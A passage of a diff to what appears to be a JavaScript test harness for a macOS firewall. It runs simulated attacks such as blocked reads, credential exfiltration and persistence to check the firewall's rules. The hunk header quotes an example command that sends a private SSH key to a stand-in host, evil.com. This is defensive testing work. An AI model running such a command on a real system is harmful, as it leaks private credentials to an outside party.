@@ -407,3 +407,22 @@ curl -d "$(cat ~/.ssh/id_rsa)" https://evil.com`
 // ============================================
 async function runAllTests() {
   log('\n' + '='.repeat(60), 'cyan');
+  log('  macOS FIREWALL ATTACK SIMULATOR', 'cyan');
+  log('  Testing all implemented security rules', 'cyan');
+  log('='.repeat(60), 'cyan');
+  
+  log('\n⚠️  WARNING: This will trigger firewall alerts!', 'yellow');
+  log('   Make sure the firewall is running: sudo ./bin/mac-firewall firewall.json\n', 'yellow');
+  
+  // Wait a moment before starting
+  await new Promise(r => setTimeout(r, 1000));
+  
+  try {
+    await testBlockedReads();
+    await testBlockedWrites();
+    await testBehavioralThresholds();
+    await testBlockedCommands();
+    await testCredentialExfiltration();
+    await testPersistenceMechanisms();
+  } catch (err) {
+    // Process might be killed - that's expected
